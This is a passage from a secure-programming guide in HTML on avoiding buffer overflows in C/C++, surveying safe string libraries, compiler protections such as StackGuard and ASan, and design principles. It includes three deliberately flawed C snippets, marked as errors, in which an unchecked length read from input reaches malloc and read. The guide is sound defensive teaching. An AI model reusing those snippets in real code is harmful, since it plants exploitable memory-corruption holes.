such as the "number of characters to be read,"
be sure to check if the number is less than zero or one.
Otherwise, the negative number may be cast to an unsigned number,
and the resulting large positive number
may then permit a buffer overflow problem.
Note that sometimes an attacker can provide a large positive number and
have the same thing happen;
in some cases, the large value will be interpreted as a negative number
(slipping by the check for large numbers if there&#8217;s no check
for a less-than-one value),
and then be interpreted later into a large positive value.

<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
> /* 1) signedness - DO NOT DO THIS. */
 char *buf;
 int i, len;

 read(fd, &#38;len, sizeof(len));

 /* OOPS!  We forgot to check for &#60; 0 */
 if (len &#62; 8000) { error("too large length"); return; }

 buf = malloc(len);
 read(fd, buf, len); /* len casted to unsigned and overflows */</PRE
></FONT
></TD
></TR
></TABLE
></P
><P
>Here&#8217;s a second example identified by Timo Sirainen,
involving integer size truncation.
Sometimes the different sizes of integers
can be exploited to cause a buffer overflow.
Basically, make sure that you don&#8217;t truncate any integer results used to
compute buffer sizes.
Here&#8217;s Timo&#8217;s example for 64-bit architectures:

 
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
> /* An example of an ERROR for some 64-bit architectures,
    if "unsigned int" is 32 bits and "size_t" is 64 bits: */
 
 void *mymalloc(unsigned int size) { return malloc(size); }
 
 char *buf;
 size_t len;
 
 read(fd, &#38;len, sizeof(len));
 
 /* we forgot to check the maximum length */
 
 /* 64-bit size_t gets truncated to 32-bit unsigned int */
 buf = mymalloc(len);
 read(fd, buf, len);</PRE
></FONT
></TD
></TR
></TABLE
></P
><P
>Here&#8217;s a third example from Timo Sirainen, involving integer overflow.
This is particularly nasty when combined with malloc(); an attacker
may be able to create a situation where the computed buffer size
is less than the data to be placed in it.
Here is Timo&#8217;s sample:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
> /* 3) integer overflow */
 char *buf;
 size_t len;
 
 read(fd, &#38;len, sizeof(len));
 
 /* we forgot to check the maximum length */
 
 buf = malloc(len+1); /* +1 can overflow to malloc(0) */
 read(fd, buf, len);
 buf[len] = '\0';</PRE
></FONT
></TD
></TR
></TABLE
></P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="LIBRARY-C"
>6.2. Library Solutions in C/C++</A
></H2
><P
>One partial solution in C/C++ is to use library functions that do not have
buffer overflow problems.
The first subsection describes the <SPAN
CLASS="QUOTE"
>&#8220;standard C library&#8221;</SPAN
> solution, which
can work but has its disadvantages.
The next subsection describes the general security issues of both
fixed length and dynamically reallocated approaches to buffers.
The following subsections describe various alternative libraries,
such as strlcpy and libmib.
Note that these don&#8217;t solve all problems; you still have to code
extremely carefully in C/C++ to avoid all buffer overflow situations.</P
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="BUFFER-STANDARD-SOLUTION"
>6.2.1. Standard C Library Solution</A
></H3
><P
>The <SPAN
CLASS="QUOTE"
>&#8220;standard&#8221;</SPAN
> solution to prevent buffer overflow in C
(which is also used in some C++ programs)
is to use the standard C library calls that defend against these problems.
This approach depends heavily on the standard library functions
strncpy(3) and strncat(3).
If you choose this approach, beware: these calls have somewhat surprising
semantics and are hard to use correctly.
The function strncpy(3) does not NIL-terminate the destination string
if the source string length is at least equal to the destination's, so
be sure to set the last character of the destination string to NIL after
calling strncpy(3).
If you&#8217;re going to reuse the same buffer many times,
an efficient approach is to tell strncpy() that the buffer is one
character shorter than it actually is and set the last character to
NIL once before use.
Both strncpy(3) and strncat(3) require that you pass
the amount of space left available, a computation
that is easy to get wrong (and getting it wrong could permit a
buffer overflow attack).
Neither provide a simple mechanism to determine if an overflow has occurred.
Finally, strncpy(3) has a significant performance penalty compared
to the strcpy(3) it supposedly replaces,
because <EM
>strncpy(3) NIL-fills the remainder of the destination</EM
>.
I&#8217;ve gotten emails expressing surprise over this last point, but this is
clearly stated in Kernighan and Ritchie second edition
[Kernighan 1988, page 249], and this behavior is clearly documented in
the man pages for Linux, FreeBSD, and Solaris.
This means that just changing from strcpy to strncpy can cause a severe
reduction in performance, for no good reason in most cases.</P
><P
>Warning!!
The function strncpy(s1, s2, n) can also be used as
a way of copying only part of s2, where n is less than strlen(s2).
When used this way, strncpy() basically provides no protection against
buffer overflow by itself - you have to take
separate actions to ensure that n is smaller than the buffer of s1.
Also, when used this way, strncpy() does not usually add a trailing NIL
after copying n characters.
This makes it harder to determine if a program using strncpy() is secure.</P
><P
>You can also use sprintf() while preventing
buffer overflows, but you need to be careful when doing so;
it&#8217;s so easy to misapply that it&#8217;s hard to recommend.
The sprintf control string can contain various conversion specifiers
(e.g., "%s"), and the control specifiers can have optional
field width (e.g., "%10s") and precision (e.g., "%.10s") specifications.
These look quite similar (the only difference is a period)
but they are very different.
The field width only
specifies a <EM
>minimum</EM
> length and is
completely worthless for preventing buffer overflows.
In contrast, the precision specification specifies the maximum
length that that particular string may have in its output when
used as a string conversion specifier - and thus it can be used
to protect against buffer overflows.
Note that the precision specification only specifies the total maximum
length when dealing with a string; it has a different meaning for
other conversion operations.
If the size is given as a precision of "*", then you can pass the maximum size
as a parameter (e.g., the result of a sizeof() operation).
This is most easily shown by an example - here&#8217;s the wrong and right
way to use sprintf() to protect against buffer overflows:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
> char buf[BUFFER_SIZE];
 sprintf(buf, "%*s",  sizeof(buf)-1, "long-string");  /* WRONG */
 sprintf(buf, "%.*s", sizeof(buf)-1, "long-string");  /* RIGHT */</PRE
></FONT
></TD
></TR
></TABLE
>
In theory, sprintf() should be very helpful because you can use it
to specify complex formats.
Sadly, it&#8217;s easy to get things wrong with sprintf().
If the format is complex, you
need to make sure that the destination is large enough for the largest
possible size of the <EM
>entire</EM
>
format, but the precision field only controls
the size of one parameter.
The "largest possible" value is often hard to determine when a
complicated output is being created.
If a program doesn&#8217;t allocate quite enough space for the longest possible
combination, a buffer overflow vulnerability may open up.
Also, sprintf() appends a NUL to the destination
after the entire operation is complete -
this extra character is easy to forget and creates an opportunity
for off-by-one errors.
So, while this works, it can be painful to use in some circumstances.</P
><P
>Also, a quick note about the code above - note that the sizeof()
operation used the size of an array.
If the code were changed so that <SPAN
CLASS="QUOTE"
>&#8220;buf&#8221;</SPAN
> was a pointer to some
allocated memory, then all <SPAN
CLASS="QUOTE"
>&#8220;sizeof()&#8221;</SPAN
> operations would have to be
changed (or sizeof would just measure the size of a pointer, which isn&#8217;t
enough space for most values).</P
><P
>The scanf() family is sadly a little murky as well.
An obvious question is whether or not the maximum width value can
be used in %s to prevent these attacks.
There are multiple official specifications for scanf();
some clearly state that the width parameter is the absolutely largest
number of characters, while others aren&#8217;t as clear.
The biggest problem is implementations; modern implementations
that I know of do support maximum widths, but I cannot say with
certainty that all libraries properly implement maximum widths.
The safest approach is to do things yourself in such cases.
However, few will fault you if you simply use scanf and include the
widths in the format strings
(but don&#8217;t forget to count \0, or you&#8217;ll get the wrong length).
If you do use scanf, it&#8217;s best to include a test in your installation
scripts to ensure that the library properly limits length.&#13;</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="STATIC-VS-DYNAMIC-BUFFERS"
>6.2.2. Static and Dynamically Allocated Buffers</A
></H3
><P
>Functions such as strncpy
are useful for dealing with statically allocated buffers.
This is a programming approach where a buffer is allocated for
the <SPAN
CLASS="QUOTE"
>&#8220;longest useful size&#8221;</SPAN
> and then it stays a fixed size from then on.
The alternative is to dynamically reallocate buffer sizes as you need them.
It turns out that both approaches have security implications.</P
><P
>There is a general security problem when using fixed-length buffers: the fact
that the buffer is a fixed length may be exploitable.
This is a problem with strncpy(3) and strncat(3), snprintf(3),
strlcpy(3), strlcat(3), and other such functions.
The basic idea is that the attacker sets up a really long string so that,
when the string is truncated, the final result will be what the
attacker wanted (instead of what the developer intended).
Perhaps the string is catenated from several smaller
pieces; the attacker might make the first piece as long as the entire
buffer, so all later attempts to concatenate strings do nothing.
Here are some specific examples:

<P
></P
><UL
><LI
><P
>Imagine code that calls gethostbyname(3) and, if
successful, immediately copies hostent-&#62;h_name to a
fixed-size buffer using strncpy or snprintf.
Using strncpy or snprintf protects against an overflow of an excessively
long fully-qualified domain name (FQDN), so you might think you&#8217;re done.
However, this could result in chopping off the end of the FQDN.
This may be very undesirable, depending on what happens next.</P
></LI
><LI
><P
>Imagine code that uses strncpy, strncat, snprintf, etc., to copy the
full path of a filesystem object to some buffer.
Further imagine that the original value was provided by an
untrusted user, and that the copying is part of a process to pass a
resulting computation to a function.
Sounds safe, right?
Now imagine that an attacker pads a path
with a large number of '/&#8217;s at the beginning.  This could
result in future operations being performed on the file <SPAN
CLASS="QUOTE"
>&#8220;/&#8221;</SPAN
>.
If the program appends values in the belief that the result will be safe,
the program may be exploitable.
Or, the attacker could devise a long filename near the buffer length, so that
attempts to append to the filename would silently fail to occur
(or only partially occur in ways that may be exploitable).</P
></LI
></UL
>&#13;</P
><P
>When using statically-allocated buffers,
you really need to consider the length of the source and destination arguments.
Sanity checking the input and the resulting intermediate computation might
deal with this, too.</P
><P
>Another alternative is to dynamically reallocate all strings instead of using
fixed-size buffers.
This general approach is recommended by the GNU programming guidelines,
since it permits programs to handle arbitrarily-sized inputs
(until they run out of memory).
Of course, the major problem with dynamically allocated strings is that you
may run out of memory.  The memory may even be exhausted at some other
point in the program than the portion where you&#8217;re worried about buffer
overflows; any memory allocation can fail.
Also, since dynamic reallocation may cause memory to be inefficiently
allocated, it is entirely possible to run out of memory even though
technically there is enough virtual memory available to the program
to continue.
In addition, before running out of memory the program will probably
use a great deal of virtual memory; this can easily result in
<SPAN
CLASS="QUOTE"
>&#8220;thrashing&#8221;</SPAN
>, a situation in which the computer spends all its time
just shuttling information between the disk and memory (instead of
doing useful work).
This can have the effect of a denial of service attack.
Some rational limits on input size can help here.
In general, the program must be designed to
fail safely when memory is exhausted if you use dynamically allocated strings.</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="STRLCPY"
>6.2.3. strlcpy and strlcat</A
></H3
><P
>An alternative, being employed by OpenBSD, is the
strlcpy(3) and strlcat(3) functions by Miller and de Raadt [Miller 1999].
This is a minimalist, statically-sized buffer approach that provides C string
copying and concatenation with a different (and less error-prone) interface.
Source and documentation of these functions
are available under a newer BSD-style open source license at
<A
HREF="ftp://ftp.openbsd.org/pub/OpenBSD/src/lib/libc/string/strlcpy.3"
TARGET="_top"
>ftp://ftp.openbsd.org/pub/OpenBSD/src/lib/libc/string/strlcpy.3</A
>.</P
><P
>First, here are their prototypes:

<TABLE
BORDER="1"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="SCREEN"
>size_t strlcpy (char *dst, const char *src, size_t size);
size_t strlcat (char *dst, const char *src, size_t size);</PRE
></FONT
></TD
></TR
></TABLE
>

Both strlcpy and strlcat
take the full size of the destination buffer as a parameter
(not the maximum number of characters to be copied) and guarantee to
NIL-terminate the result (as long as size is larger than 0).
Remember that you should include a byte for NIL in the size.</P
><P
>The strlcpy function copies up to
size-1 characters from the NUL-terminated string src to dst,
NIL-terminating the result.
The strlcat
function appends the NIL-terminated string
src to the end of dst.
It will append at most 
size - strlen(dst) - 1 bytes, NIL-terminating the result.</P
><P
>One minor disadvantage of strlcpy(3) and strlcat(3) is that they are
not, by default, installed in most Unix-like systems.
In OpenBSD, they are part of &#60;string.h&#62;.
This is not that difficult a problem; since they are small functions, you can
even include them in your own program&#8217;s source (at least as an option),
and create a small separate package to load them.
You can even use autoconf to handle this case automatically.
If more programs use these functions, it won&#8217;t be long before these are
standard parts of Linux distributions and other Unix-like systems.
Also, these functions have
been recently added to the <SPAN
CLASS="QUOTE"
>&#8220;glib&#8221;</SPAN
> library (I submitted the patch
to do this), so using recent versions of glib makes them available.
In glib these functions are named g_strlcpy and g_strlcat
(not strlcpy or strlcat) to be consistent with the glib library
naming conventions.</P
><P
>Also, strlcat(3) has slightly varying semantics
when the provided size is 0 or if there are no NIL characters in
the destination string dst (inside the given number of characters).
In OpenBSD, if the size is 0, then the destination string&#8217;s length is
considered 0.
Also, if size is nonzero, but there are no NIL characters
in the destination string (in the size number of characters), then
the length of the destination is considered equal to the size.
These rules make handling strings without embedded NILs consistent.
Unfortunately, at least Solaris doesn&#8217;t (at this time) obey these rules,
because they weren&#8217;t specified in the original documentation.
I&#8217;ve talked to Todd Miller, and he and I agree that the OpenBSD
semantics are the correct ones (and that Solaris is incorrect).
The reasoning is simple: under no condition should strlcat or strlcpy
ever examine characters in the destination outside of the range of size;
such access might cause core dumps (from accessing out-of-range memory)
and even hardware interactions (through memory-mapped I/O).
Thus, given:
<TABLE
BORDER="1"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="SCREEN"
>  a = strlcat ("Y", "123", 0);</PRE
></FONT
></TD
></TR
></TABLE
>
The correct answer is 3 (0+3=3), but Solaris will claim the answer is 4
because it incorrectly looks at characters beyond the "size" length in
the destination.
For now, I suggest avoiding cases where the size is 0 or the destination
has no NIL characters.
Future versions of glib will hide this difference and always use the OpenBSD
semantics.</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="ASPRINTF"
>6.2.4. asprintf and vasprintf</A
></H3
><P
>When using C (not C++), and a dynamic memory allocation approach can be used,
the asprintf and vasprintf functions are an especially useful
way to solve the problem of safely avoiding buffer overflow.
The asprintf() and vasprintf() functions
are analogs of sprintf(3) and vsprintf(3), except that they
automatically allocate a new C string and return a pointer to that string.
They have the following form:</P
><TABLE
BORDER="1"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="SCREEN"
>  int asprintf(char **strp, const char *fmt, ...);
  int vasprintf(char **strp, const char *fmt, va_list ap); </PRE
></FONT
></TD
></TR
></TABLE
><P
>Since these functions allocate memory, you must pass
the pointer to free(3) to deallocate.
These functions return the number of bytes "printed"
(and -1 if there is an error).</P
><P
>These functions are relatively simple to use, 
and in particular they don't terminate results in middle
(a problem with any fixed-length buffer solution).
Here is an example:</P
><TABLE
BORDER="1"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="SCREEN"
>  char *result;
  asprintf(&#38;result, "x=%s and y=%s\n", x, y);</PRE
></FONT
></TD
></TR
></TABLE
><P
>The asprintf() and vasprintf() functions are
widely used to get things done in C without buffer overflows.
One problem with them is that they are not actually standard
(they are not in C11).
That said, they are widely implemented; they are in the GNU C library
and in the *BSDs (including Apple's).
They are also relatively trivial to recreate on other systems, e.g.,
it's possible to re-implement this on Windows with less than 20 lines of code.
There is some variation in error handling;
FreeBSD sets strp to NULL on an error, while others don't; users should
not depend on either behavior.
Another problem is that their wide use can
easily lead to memory leaks; as with any C function that allocates memory,
you must manually deallocate the allocated memory.</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="LIBMIB"
>6.2.5. libmib</A
></H3
><P
>One toolset for C that dynamically reallocates strings automatically
is the <SPAN
CLASS="QUOTE"
>&#8220;libmib allocated string functions&#8221;</SPAN
> by
Forrest J. Cavalier III, available at
<A
HREF="http://www.mibsoftware.com/libmib/astring"
TARGET="_top"
>http://www.mibsoftware.com/libmib/astring</A
>.
There are two variations of libmib; <SPAN
CLASS="QUOTE"
>&#8220;libmib-open&#8221;</SPAN
> appears to be clearly
open source under its own X11-like license that
permits modification and redistribution, but redistributions must choose
a different name, however, the developer states that it
<SPAN
CLASS="QUOTE"
>&#8220;may not be fully tested.&#8221;</SPAN
>
To continuously get libmib-mature, you must pay for a subscription.
The documentation is not open source, but it is freely available.
If you are considering the use of this library, you should also look at
Messier and Viega&#8217;s Safestr library (discussed next).</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="SAFESTR"
>6.2.6. Safestr library (Messier and Viega)</A
></H3
><P
>The Safe C String (Safestr) library by Messier and Viega is available from
<A
HREF="http://www.zork.org/safestr"
TARGET="_top"
>http://www.zork.org/safestr</A
>.
Safestr provides a set of string functions for C that automatically
reallocates strings as necessary.
Safestr strings easily convert to regular C "char *" strings, using the
same trick used by most malloc() implementations: safestr stores
important information at addresses "before" the pointer passed around -
so it&#8217;s easier to use safestr in existing programs.
Safestr supports setting strings to be read-only, and supports
<SPAN
CLASS="QUOTE"
>&#8220;trusted&#8221;</SPAN
>
value of strings that can be used to help detect problems.
Safestr is released under a open source BSD-style license.
Note that safestr requires XXL, a library
that adds support for exception handling and asset management in C.</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="STD-STRING"
>6.2.7. C++ std::string class</A
></H3
><P
>C++ developers can use the std::string class, which is built into the
language.
This is a dynamic approach, as the storage grows as necessary.
However, it&#8217;s important to note that if that class&#8217;s data is turned
into a <SPAN
CLASS="QUOTE"
>&#8220;char *&#8221;</SPAN
> (e.g., by using data() or c_str()),
the possibilities of buffer overflow resurface, so you need to be careful
when when using such methods.
Note that c_str() always returns a NIL-terminated string, but
data() may or may not (it&#8217;s implementation dependent, and most
implementations do not include the NIL terminator).
Avoid using data(), and if you must use it, don&#8217;t be dependent on its format.</P
><P
>Many C++ developers use other string libraries as well, such as
those that come with other large libraries or even home-grown string libraries.
With those libraries, be especially careful - many
alternative C++ string classes
include routines to automatically convert the class to a <SPAN
CLASS="QUOTE"
>&#8220;char *&#8221;</SPAN
> type.
As a result, they can silently introduce buffer overflow vulnerabilities.</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="LIBSAFE"
>6.2.8. Libsafe</A
></H3
><P
>Arash Baratloo, Timothy Tsai, and Navjot Singh
(of Lucent Technologies)
have developed Libsafe, a wrapper of several library functions known to be
vulnerable to stack smashing attacks.
This wrapper (which they call a kind of <SPAN
CLASS="QUOTE"
>&#8220;middleware&#8221;</SPAN
>)
is a simple dynamically loaded library that contains modified versions
of C library functions such as strcpy(3).
These modified versions
implement the original functionality, but in a manner that ensures
that any buffer overflows are contained within the current stack frame.
Their initial performance analysis suggests that this
library&#8217;s overhead is very small.
Libsafe papers and source code are available at
<A
HREF="http://www.research.avayalabs.com/project/libsafe"
TARGET="_top"
>http://www.research.avayalabs.com/project/libsafe</A
>.
The Libsafe source code is available under the completely
open source LGPL license.</P
><P
>Libsafe&#8217;s approach appears somewhat useful.
Libsafe should certainly be considered for inclusion by Linux
distributors, and its approach is worth considering by others as well.
For example, I know that the Mandrake distribution of Linux (version
7.1) includes it.
However, as a software developer, Libsafe is a useful mechanism
to support defense-in-depth but it does not really prevent buffer
overflows.
Here are several reasons why you shouldn&#8217;t depend just on Libsafe
during code development:
<P
></P
><UL
><LI
><P
>Libsafe only protects a small set of known functions with obvious
buffer overflow issues.
At the time of this writing, this list is significantly shorter than
the list of functions in this book known to have this problem.
It also won&#8217;t protect against code you write yourself (e.g., in
a while loop) that causes buffer overflows.</P
></LI
><LI
><P
>Even if libsafe is installed in a distribution, the way it is installed
impacts its use.
The documentation recommends setting LD_PRELOAD 
to cause libsafe&#8217;s protections to be enabled, but the problem
is that users can unset this environment variable... causing the
protection to be disabled for programs they execute!</P
></LI
><LI
><P
>Libsafe only protects against buffer overflows of the stack onto the
return address;
you can still overrun the heap or other variables in that procedure&#8217;s frame.</P
></LI
><LI
><P
>Unless you can be assured that all deployed platforms will use libsafe
(or something like it), you&#8217;ll have to protect your program as though
it wasn&#8217;t there.</P
></LI
><LI
><P
>LibSafe seems to assume that saved frame pointers are at the beginning of
each stack frame.  This isn&#8217;t always true. 
Compilers (such as gcc) can optimize away things, and in particular the
option "-fomit-frame-pointer" removes the information that libsafe
seems to need.
Thus, libsafe may fail to work for some programs.</P
></LI
></UL
></P
><P
>The libsafe developers themselves acknowledge that software developers
shouldn&#8217;t just depend on libsafe.
In their words:

<A
NAME="AEN1715"
></A
><BLOCKQUOTE
CLASS="BLOCKQUOTE"
><P
>It is generally accepted that the best solution to
buffer overflow attacks is to fix the defective programs.
However, fixing defective programs requires knowing that
a particular program is defective.
The true benefit of using libsafe and other alternative
security measures is protection against future attacks
on programs that are not yet known to be vulnerable. </P
></BLOCKQUOTE
></P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="OTHER-BUFFER-LIBRARIES"
>6.2.9. Other Libraries</A
></H3
><P
>The glib (not glibc) library is a widely-available
open source library that provides
a number of useful functions for C programmers.
GTK+ and GNOME both use glib, for example.
As I noted earlier, in glib version 1.3.2, g_strlcpy() and g_strlcat() have
been added through a patch which I submitted. This should make it easier to
portably use those functions once these later versions of glib
become widely available.
At this time I do not have an analysis showing definitively that the
glib library functions protect against buffer overflows.
However, many of the glib functions automatically allocate memory,
and those functions automatically
<EM
>fail with no reasonable way to intercept the failure</EM
>
(e.g., to try something else instead).
As a result, in many cases most glib functions cannot
be used in most secure programs.
The GNOME guidelines recommend using functions such as
g_strdup_printf(), which is fine as long as it&#8217;s okay if your program
immediately crashes if an out-of-memory condition occurs.
However, if you can&#8217;t accept this, then using such routines isn&#8217;t appropriate.</P
></DIV
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="COMPILATION-C"
>6.3. Compilation Solutions in C/C++</A
></H2
><P
>A completely different approach is to use compilation methods that perform
bounds-checking (see [Sitaker 1999] for a list).
In my opinion, such tools are very useful in having multiple layers of
defense, but it&#8217;s not wise to use this technique as your sole defense.
Many such tools only provide a partial defense.
More-complete defenses tend to be slower (and generally people choose
to use C/C++ because performance is important for their application).
Also, for open source programs you cannot be certain what tools
will be used to compile the program;
using the default <SPAN
CLASS="QUOTE"
>&#8220;normal&#8221;</SPAN
> compiler
for a given system might suddenly open security flaws.</P
><P
>Historically a very important tool is
<SPAN
CLASS="QUOTE"
>&#8220;StackGuard&#8221;</SPAN
>, a modification of the
standard GNU C compiler gcc.
StackGuard works by inserting a <SPAN
CLASS="QUOTE"
>&#8220;guard&#8221;</SPAN
> value (called a <SPAN
CLASS="QUOTE"
>&#8220;canary&#8221;</SPAN
>)
in front of the return address; if a buffer overflow
overwrites the return address, the canary&#8217;s value (hopefully) changes
and the system detects this before using it.
This is quite valuable, but note that this does not protect against
buffer overflows overwriting other values (which they may still be able
to use to attack a system).
There is work to extend StackGuard to be able to add canaries to other
data items, called <SPAN
CLASS="QUOTE"
>&#8220;PointGuard&#8221;</SPAN
>.
PointGuard will automatically protect certain values (e.g., function
pointers and longjump buffers).
However, protecting other variable types using PointGuard
requires specific programmer intervention (the programmer
has to identify which data values must be protected with canaries).
This can be valuable, but it&#8217;s easy to accidentally omit
protection for a data value you didn&#8217;t think needed protection -
but needs it anyway.
More information on StackGuard, PointGuard, and other alternatives
is in Cowan [1999].
StackGuard inspired the development of many other run-time mechanisms to
detect and counter attacks.</P
><P
><A
HREF="http://www.trl.ibm.com/projects/security/ssp"
TARGET="_top"
>IBM
has developed a stack protection system called ProPolice
based on the ideas of StackGuard</A
>.
IBM doesn&#8217;t include the ProPolice name in its current website - it&#8217;s just called
a "GCC extension for protecting applications from stack-smashing attacks".
However, it&#8217;s hard to talk about something without using a name, so
I&#8217;ll continue to use the name ProPolice.
Like StackGuard, ProPolice
is a GCC (Gnu Compiler Collection) extension for
protecting applications from stack-smashing attacks.
Applications written in C are protected by automatically inserting
protection code into an application at compilation time.
ProPolice is slightly different than StackGuard, however, by adding
three features:
(1) reordering local variables to place buffers after pointers
(to avoid the corruption of pointers that could be used
to further corrupt arbitrary memory locations),
(2) copying pointers in function arguments to an area
preceding local variable buffers (to prevent the corruption of pointers
that could be used to further corrupt arbitrary memory locations), and
(3) omitting instrumentation code from some functions
(it basically assumes that only character arrays are dangerous; while
this isn&#8217;t strictly true, it&#8217;s mostly true, and as a result ProPolice
has better performance while retaining most of its protective capabilities).</P
><P
>Red Hat engineers in 2005 re-implemented buffer overflow countermeasures
in GCC based on lessons learned from ProPolice.
They implemented the GCC flags -fstack-protector flag
(which only protects some vulnerable functions), and the
-fstack-protector-all flag (which protects all functions).
In 2012, Google engineers added the -fstack-protector-strong flag
that tries to strike a better balance (it protects more functions than
-fstack-protector, but not all of them as -fstack-protector-all does).
Many Linux distributions use one of these flags, as a default or for
at least some packages, to harden application programs.</P
><P
>On Windows, Microsoft&#8217;s compilers include the /GS option to include
StackGuard-like protection against buffer overflows.
However, it&#8217;s worth noting that
at least on
<A
HREF="http://www.nextgenss.com/papers/defeating-w2k3-stack-protection.pdf "
TARGET="_top"
>Microsoft Windows 2003 Server these protection mechanisms can be
defeated.</A
></P
><P
>An especially strong hardening approach is "Address Sanitizer" (ASan).
ASan is available in LLVM and gcc compilers as the "-fsanitize=address" flag.
ASan counters buffer overflow (global/stack/heap),
use-after-free, and double-free based attacks.
It can also detect use-after-return and memory leaks.
It can also counters some other C/C++ memory issues,
but due to its design it cannot detect read-before-write.
Its has a measured overhead of
73% average CPU overhead (often 2x), with 2x-4x memory overhead;
this is low compared to previous approaches, but it is still significant.
Still, this is sometimes acceptable overhead for deployment,
and it is typically quite acceptable for testing including fuzz testing.
The development processes for Chromium and Firefox, for example, use ASan.
Details of how ASan works is available at
<A
HREF="http://code.google.com/p/address-sanitizer/"
TARGET="_top"
>http://code.google.com/p/address-sanitizer/</A
>,
particularly in the paper
"AddressSanitizer: A Fast Address Sanity Checker" by Konstantin Serebryany, Derek Bruening, Alexander Potapenko, and Dmitry Vyukov (Google), USENIX ATC 2012
Fundamentally ASan uses "shadow bytes" to record memory addressability.
ASAN tracks addressability of memory, where addressability means
if a read or write is permitted.
All memory allocations (global, stack, and heap) are
aligned to (at least) 8 bytes, and every 8 bytes of memory's
addressability is represented by a "shadow byte".
In the shadow byte, a 0 means all 8 bytes addressable, 1..7 means
only next N are addressable,
and negative (high bit) means no bytes are addressable.
All allocations are surrounded by inaccessible "red zones"
(with a default size of 128 bytes).
Every allocation/deallocation in stack and heap manipulates the shadow bytes,
and every read/write first checks the shadow bytes to see if
access is allowed.
This countermeasure is very strong, though it
can be fooled if a calculated address is in a different valid region.
That said, ASAN is a remarkably strong defense for applications written
in C or C++, in cases where these overheads are acceptable.</P
><P
>A "non-executable segment" approach was developed by
Ingo Molnar, termed
<A
HREF="http://lwn.net/Articles/31032/"
TARGET="_top"
>Exec Shield</A
>.
Molnar&#8217;s exec shield limits the region that executable code can exist,
and then moves executable code below that region.
If the code is moved to an area where a zero byte must occur, then
it&#8217;s harder to exploit because many ASCII-based attacks cannot insert
a zero byte.
This isn&#8217;t foolproof, but it does prevent certain attacks.
However, many programs invoke libraries that in aggregate are so large
that their addresses can have a non-zero in them, making them much
more vulnerable.</P
><P
>A different approach is to limit transfer of control; this doesn&#8217;t
prevent all buffer overflow attacks (e.g., those that attack data) but
it can make other attacks harder
[Kiriansky 2002]</P
><P
>In short, it&#8217;s better to work first on developing a correct program
that defends itself against buffer overflows.
Then, after you&#8217;ve done this, by all means use techniques and tools
like StackGuard as an additional safety net.
If you&#8217;ve worked hard to eliminate buffer overflows in the code itself,
then StackGuard (and tools like it) are
are likely to be more effective because there will be
fewer <SPAN
CLASS="QUOTE"
>&#8220;chinks in the armor&#8221;</SPAN
> that StackGuard will be called on to protect.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="OTHER-LANGUAGES"
>6.4. Other Languages</A
></H2
><P
>The problem of buffer overflows is an excellent argument for using
other programming languages
such as Perl, Python, Java, and Ada95.
After all, nearly all other programming languages used today
(other than assembly language) protect against buffer overflows.
Using those other languages does not eliminate all problems, of course;
in particular see the discussion in <A
HREF="#HANDLE-METACHARACTERS"
>Section 8.3</A
>
regarding the NIL character.
There is also the problem of ensuring that those other languages'
infrastructure (e.g., run-time library) is available and secured.
Still, you should certainly consider using other programming languages
when developing secure programs to protect against buffer overflows.</P
></DIV
></DIV
><DIV
CLASS="CHAPTER"
><HR><H1
><A
NAME="INTERNALS"
></A
>Chapter 7. Design Your Program for Security</H1
><TABLE
BORDER="0"
WIDTH="100%"
CELLSPACING="0"
CELLPADDING="0"
CLASS="EPIGRAPH"
><TR
><TD
WIDTH="45%"
>&nbsp;</TD
><TD
WIDTH="45%"
ALIGN="LEFT"
VALIGN="TOP"
><I
><P
><I
>Like a city whose walls are broken down is a man who lacks self-control.</I
></P
></I
></TD
></TR
><TR
><TD
WIDTH="45%"
>&nbsp;</TD
><TD
WIDTH="45%"
ALIGN="RIGHT"
VALIGN="TOP"
><I
><SPAN
CLASS="ATTRIBUTION"
>Proverbs 25:28 (NIV)</SPAN
></I
></TD
></TR
></TABLE
><P
>Some program designs are relatively easy to secure;
others are practically impossible.
If you want a secure application, you&#8217;ll need to
follow good security design principles.
In particular, you should minimize the privileges your program
(and its parts) have, so that the inevitable mistakes are much less likely
to become security vulnerabilities.</P
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="FOLLOW-GOOD-PRINCIPLES"
>7.1. Follow Good Security Design Principles</A
></H2
><P
>Saltzer [1974] and later Saltzer and Schroeder [1975]
list the following design principles when creating secure programs,
which are still valid:

<P
></P
><UL
><LI
><P
><EM
>Least privilege</EM
>.
Each user and program should operate using the fewest privileges possible.
This principle limits the damage from an accident, error, or attack.
